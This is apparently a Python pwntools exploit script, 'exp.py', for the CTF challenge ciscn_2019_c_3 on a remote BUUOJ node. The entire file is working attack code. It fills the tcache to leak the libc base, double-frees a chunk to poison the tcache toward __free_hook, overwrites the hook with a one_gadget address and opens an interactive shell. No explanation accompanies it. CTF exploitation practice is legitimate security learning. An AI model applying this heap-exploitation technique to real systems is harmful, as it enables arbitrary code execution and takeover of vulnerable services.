#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/28 19:00:40
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process(['./ciscn_2019_c_3'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc/libc-2.27.so'})
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 26852
    sh = remote(IP,port)
    libc = ELF('../../libc/libc-2.27.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('./ciscn_2019_c_3')

def cmd(choice):
    sh.recvuntil("Command: \n")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("size: \n")
    sh.sendline(str(size))
    sh.recvuntil("Give me the name: \n")
    sh.sendline(content)

def show(idx):
    cmd(2)
    sh.recvuntil("index: \n")
    sh.sendline(str(idx))


def dele(idx):
    cmd(3)
    sh.recvuntil("weapon:\n")
    sh.sendline(str(idx))
def backdoor(idx):
    cmd(666)
    sh.recvuntil("weapon:\n")
    sh.sendline(str(idx))

add(0x100,'a') #0
add(0x100,'b') #1
add(0x60,'c') #2
for i in range(7):
    dele(0)

dele(1)
show(1)

sh.recvuntil("attack_times: ")
libc_base = int(sh.recvuntil("\n",drop=True)) - 0x3ebca0
log.info("libc_base=>{}".format(hex(libc_base)))
free_hook = libc_base + libc.symbols['__free_hook']
one = libc_base + 0x4f322
dele(2)
dele(2)
dele(2)
add(0x60,'a'*0x10 + p64(free_hook-0x10)) #3
dele(2)
for i in range(0x20):
    backdoor(2)
add(0x60,'1')
add(0x60,'2')
add(0x60,p64(one))
dele(0)
sh.interactive()
